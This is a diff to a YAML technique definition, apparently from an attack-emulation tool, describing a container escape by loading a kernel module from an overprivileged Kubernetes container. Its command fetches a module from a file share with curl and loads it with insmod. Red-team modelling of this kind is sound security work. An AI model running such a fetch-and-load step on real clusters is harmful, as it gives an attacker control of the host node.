@@ -2,15 +2,18 @@ name: Escape container via kernel module 🚧
 description: Load a kernel module from within an overprivileged container to breakout into the node.
 tactic: "Privilege Escalation"
 techniques: ["Escape to Host", T1611]
+staatus: disabled
 preconditions:
-  # "kind": Session
+  "kind": Session
   "Pod.securityContext.privileged": true
   "Container.securityContext.capabilities": CAP_SYS_MODULE
 effects: []
 command: "EscapeHost"
-cmd: |
-  curl -O ${FILESHARE}/${MODULE};
-  insmod ${MODULE}
+procedures:
+  - key: curl
+    command: |
+      curl -O ${FILESHARE}/${MODULE};
+      insmod ${MODULE}
 defend:
   # - tactic: detect
   #   id: D3-SCA
